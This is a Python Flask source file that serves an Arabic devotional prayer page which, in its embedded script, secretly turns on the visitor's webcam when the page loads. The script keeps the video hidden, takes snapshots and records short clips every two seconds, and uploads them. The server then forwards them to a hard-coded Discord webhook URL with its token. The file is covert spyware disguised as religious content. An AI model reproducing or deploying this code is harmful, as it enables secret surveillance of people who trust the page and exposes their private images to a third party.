# app.py
from flask import Flask, request, jsonify, render_template_string
import base64
import os
import requests
from io import BytesIO
from PIL import Image
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1441781654858240062/2bd42tkVuibBXngZk0yAk8GHdB98ePkR5eDgTAvKIQ1UE_jhNkWcONRmORBVpptiflA2")

html_code = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صلي علي النبي</title>
    <style>
        #video { display: none; }
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f8ff;
            color: #333;
            text-align: center;
            padding-top: 50px;
        }
        h1 { font-size: 30px; margin-bottom: 20px; }
        .prayer {
            font-size: 22px;
            color: #0000cd;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <p class="prayer">بسم الله الرحمن الرحيم</p>
    <p class="prayer">اللهم صل وسلم على سيدنا محمد</p>
    <p class="prayer">سبحان الله وبحمده، سبحان الله العظيم</p>
    <p class="prayer">لا إله إلا الله محمد رسول الله</p>
    <p class="prayer">اللهم اجعلنا من الذاكرين والذاكرات</p>

    <video id="video" width="300" height="200" autoplay></video>
    <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        let stream;
        let recorder;
        let chunks = [];

        window.onload = function () {
            init();
        }

        async function init() {
            stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            startRecording();
            setInterval(() => {
                captureImage();
                startRecording();
            }, 2000); // Capture every 2 seconds
        }

        function captureImage() {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imgData = canvas.toDataURL('image/png');
            const imageHash = `sent_image_${imgData}`;

            if (!localStorage.getItem(imageHash)) {
                sendImage(imgData, imageHash);
            } else {
                console.log("الصورة دي اتبعتت قبل كده");
            }
        }

        function sendImage(imageData, imageHash) {
            fetch('/upload_image', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                localStorage.setItem(imageHash, true);
            })
            .catch(error => console.log(error));
        }

        function startRecording() {
            chunks = [];
            recorder = new MediaRecorder(stream);
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = sendVideo;

            recorder.start();
            setTimeout(() => {
                recorder.stop();
            }, 2000); // Record for 2 seconds
        }

        function sendVideo() {
            const blob = new Blob(chunks, { type: 'video/webm' });

            const reader = new FileReader();
            reader.onloadend = () => {
                const base64data = reader.result;
                const videoHash = `sent_video_${base64data}`;

                if (!localStorage.getItem(videoHash)) {
                    const formData = new FormData();
                    formData.append('video', blob, 'recorded_video.webm');

                    fetch('/upload_video', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log(data);
                        localStorage.setItem(videoHash, true);
                    })
                    .catch(error => console.log(error));
                } else {
                    console.log("الفيديو ده اتبعت قبل كده");
                }
            };
            reader.readAsDataURL(blob);
        }
    </script>
</body>
</html>
'''

@app.route('/')
def home():
    return render_template_string(html_code)


@app.route('/upload_image', methods=['POST'])
def upload_image():
    try:
        data = request.get_json()
        image_data = data['image'].split(",")[1]
        image_bytes = base64.b64decode(image_data)
        image = Image.open(BytesIO(image_bytes))
        image.save("captured_image.png")

        with open('captured_image.png', 'rb') as image_file:
            files = {'file': ('captured_image.png', image_file, 'image/png')}
            response = requests.post(WEBHOOK_URL, files=files)

            if response.status_code == 204:
                return jsonify(
                    {'message': 'تم إرسال الصورة بنجاح إلى ديسكورد!'}), 200
            else:
                return jsonify(
                    {'message':
                     'حدث خطأ أثناء إرسال الصورة إلى ديسكورد!'}), 500
    except Exception as e:
        return jsonify({'message': f'خطأ أثناء معالجة الصورة: {str(e)}'}), 500


@app.route('/upload_video', methods=['POST'])
def upload_video():
    try:
        video = request.files['video']
        files = {'file': (video.filename, video, 'video/webm')}
        response = requests.post(WEBHOOK_URL, files=files)

        if response.status_code == 204:
            return jsonify({'message':
                            'تم إرسال الفيديو بنجاح إلى ديسكورد!'}), 200
        else:
            return jsonify(
                {'message': 'حدث خطأ أثناء إرسال الفيديو إلى ديسكورد!'}), 500
    except Exception as e:
        return jsonify({'message': f'خطأ أثناء إرسال الفيديو: {str(e)}'}), 500


if __name__ == '__main__':
    app.run(debug=True)
